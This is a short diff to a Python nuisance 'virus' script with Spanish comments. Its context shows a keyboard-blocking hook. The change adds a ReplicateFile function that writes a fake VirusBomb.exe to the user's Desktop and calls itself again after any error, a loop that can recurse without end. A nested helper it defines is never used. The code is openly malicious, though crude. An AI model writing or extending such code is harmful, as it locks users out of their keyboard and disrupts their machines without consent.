@@ -43,17 +43,20 @@ def Block():    # Lib [KeyandMouse_Block]
         k.HookKeyboard()
         pythoncom.PumpMessages()    # Bloquea Teclado
 
-def CreateFiles():  #Crea block de notas en el escritorio
-    try:  # Intenta crear la dirección
-        os.makedirs('C:\\Users\\'+str(getuser())+'\\Desktop')
+def ReplicateFile():  #Crea block de notas en el escritorio
+    def CreataDirectory():
+        try:  # Intenta crear la dirección
+            os.makedirs('C:\\Users\\'+str(getuser())+'\\Desktop')
+        except:
+            pass
+    try:
+        log = os.environ.get( 'pylogger_file',os.path.expanduser('C:\\Users\\'+str(getuser())+'\\Desktop\\VirusBomb.exe'))
+        with open (log, "a") as v:
+            v.write("Virus Bomb...") #Escribe el Texto que irá dentro del ex  
     except:
-        pass
-    log = os.environ.get(
-        'pylogger_file',
-        os.path.expanduser('C:\\Users\\'+str(getuser())+'\\Desktop\\VirusBomb.exe')
-        )
-    with open (log, "a") as f:
-        f.write("[Escribe el Texto oculto dentro del EXE]") #Escribe el Texto que irá dentro de los txt
+        ReplicateFile()
+        
+        
 def saturar():
     pass
 
